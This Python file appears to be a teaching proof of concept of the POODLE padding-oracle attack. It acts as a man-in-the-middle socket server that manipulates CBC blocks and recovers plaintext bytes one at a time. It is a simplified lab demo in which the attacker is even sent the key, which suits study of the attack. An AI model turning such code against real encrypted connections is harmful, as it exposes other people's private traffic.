'''This PoC uses the Poodle attack - PoC of mpgn <martial.puygrenier@gmail.com>'''

import binascii
import sys
import hmac, hashlib
from Crypto.Cipher import AES
from Crypto import Random

import sys
sys.path.append('../')

from common.string_socket import StringSocket

IV = Random.new().read(AES.block_size )
KEY = Random.new().read(AES.block_size )

# unpad after the decryption 
# return the msg, the hmac and the hmac of msg 
def unpad_verifier(s):
    msg = s[0:len(s) - 32 - ord(s[len(s)-1:]) - 1]
    hash_c = s[len(msg):-ord(s[len(s)-1:]) - 1]
    hash_d = hmac.new(KEY, msg, hashlib.sha256).digest()
    return msg, hash_d, hash_c

# decipher a message then check if padding is good with unpad_verifier()
def decrypt( enc):
    decipher = AES.new(KEY, AES.MODE_CBC, IV)
    plaintext, signature_2, sig_c = unpad_verifier(decipher.decrypt( enc ))

    if signature_2 != sig_c:
        return 0
    return plaintext

def split_len(seq, length):
    return [seq[i:i+length] for i in range(0, len(seq), length)]


def main():
	skt = StringSocket()
	
	skt.bind('0.0.0.0', 8080)
	skt.listen(1)
	print("Soy el Man in the Middle")

	request_skt, addr = skt.accept()

	print(f"Veo una conexion de: {addr}")
	print("Soy el Man in the Middle y estoy viendo los paquetes que viajan")

	secret = []
	t=1
	block=1
	length_block=16
	msg = "hola"
	coming = 0
	while (msg!=b'0'.hex()):
		if (coming == 0):
			msg = request_skt.receive_with_size()
			coming +=1
		if (coming == 1):
			global IV
			IV = bytes.fromhex(request_skt.receive_with_size())
			coming +=1
		if (coming == 2):
			global KEY
			KEY = bytes.fromhex(request_skt.receive_with_size())
			coming = 0
		count=0
		msg = split_len(bytes.fromhex(msg),32)
		msg[-1] = msg[block]
		# send the request a get the result => padding error OR OK
		cipher = binascii.unhexlify(b''.join(msg).decode())
		plain = decrypt(cipher)
		count += 1

		if (plain != 0):
			if (coming == 0):
				t += 1
				pbn = msg[-2]
				pbi = msg[block - 1]
				# padding is ok we found a byte
				decipher_byte = chr(int("0f",16) ^ int(pbn[-2:],16) ^ int(pbi[-2:],16))
				secret.append(decipher_byte)
				tmp = secret[::-1]
				sys.stdout.write("\r[+] Found byte \033[36m%s\033[0m - Block %d : [%16s]" % (decipher_byte, block, ''.join(tmp)))
				sys.stdout.flush()
				request_skt.send_with_size("Adivinado")
				print("")
				if (t == 17):
					request_skt.close()
					skt.close()
					exit()
				#break
		else:
			request_skt.send_with_size("No")

if __name__ == '__main__':
	main()
